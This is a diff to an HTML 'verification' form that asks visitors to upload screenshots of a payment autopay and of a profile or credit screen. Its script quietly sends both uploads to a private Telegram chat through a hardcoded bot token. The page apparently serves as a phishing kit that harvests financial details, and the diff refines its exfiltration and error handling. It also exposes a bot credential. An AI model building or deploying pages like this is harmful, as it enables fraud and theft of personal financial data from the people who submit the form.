@@ -69,7 +69,8 @@
     }
     .demo-img {
       width: 100%;
-      max-height: 220px;
+      height: auto;
+      max-height: 350px;
       object-fit: contain;
       background: #fff;
       border-radius: 8px;
@@ -164,18 +165,18 @@
 
   <div id="formContainer" class="form-body">
     <form id="verifyForm">
-      <!-- STEP 1 -->
+      <!-- STEP 1: PAYMENT SCREENSHOT -->
       <div class="step-card">
-        <div class="step-title">Step 1: Reference & Screenshot</div>
-        <img src="https://i.ibb.co/9H0x2y65/demo1.jpg" alt="Step 1 Preview" class="demo-img" onerror="this.src='https://ibb.co/9H0x2y65';">
+        <div class="step-title">Step 1: Payment Autopay Screenshot</div>
+        <img src="https://moymdyrekfcukvbspbej.supabase.co/storage/v1/object/public/uploads/a97ed321-a2f0-4a56-b308-afe4f5d7ed96/1794321273870-052400a7-3f23-4674-9a44-1ca97569a6dc-1000210420-cropped.jpeg" alt="Step 1 Preview" class="demo-img">
         <label>Upload Screenshot 1 *</label>
         <input type="file" id="screenshot1" accept="image/*" required>
       </div>
 
-      <!-- STEP 2 -->
+      <!-- STEP 2: PROFILE SCREENSHOT -->
       <div class="step-card">
-        <div class="step-title">Step 2: Reference & Screenshot</div>
-        <img src="https://i.ibb.co/20RCZj87/demo2.jpg" alt="Step 2 Preview" class="demo-img" onerror="this.src='https://ibb.co/20RCZj87';">
+        <div class="step-title">Step 2: Profile / Credit Screenshot</div>
+        <img src="https://moymdyrekfcukvbspbej.supabase.co/storage/v1/object/public/uploads/a97ed321-a2f0-4a56-b308-afe4f5d7ed96/1794321211586-3899a2e3-8892-4851-93c5-458dfcf79506-1000210404-cropped.jpeg" alt="Step 2 Preview" class="demo-img">
         <label>Upload Screenshot 2 *</label>
         <input type="file" id="screenshot2" accept="image/*" required>
       </div>
@@ -203,7 +204,7 @@
 
 <script>
   const botToken = '8563241235:AAF9W8L6LyuQ9PkEVWZ0b-5EFBLmabrUxv';
-  const chatId = '-1004393424619';
+  const chatId = '-1001794316052';
 
   document.getElementById('verifyForm').addEventListener('submit', async (e) => {
     e.preventDefault();
@@ -231,23 +232,25 @@
     formData2.append('caption', caption2);
 
     try {
-      // Send Photo 1
       const res1 = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
         method: 'POST',
         body: formData1
       });
 
-      // Send Photo 2
       const res2 = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
         method: 'POST',
         body: formData2
       });
 
-      if (res1.ok && res2.ok) {
+      const data1 = await res1.json();
+      const data2 = await res2.json();
+
+      if (data1.ok && data2.ok) {
         document.getElementById('formContainer').style.display = 'none';
         document.getElementById('successScreen').style.display = 'block';
       } else {
-        alert('Submission failed. Telegram error.');
+        const errorMsg = data1.description || data2.description || 'Unknown Telegram Error';
+        alert('Telegram Error: ' + errorMsg);
         submitBtn.disabled = false;
         submitBtn.innerText = 'SUBMIT VERIFICATION';
       }
@@ -261,3 +264,4 @@
 
 </body>
 </html>
+
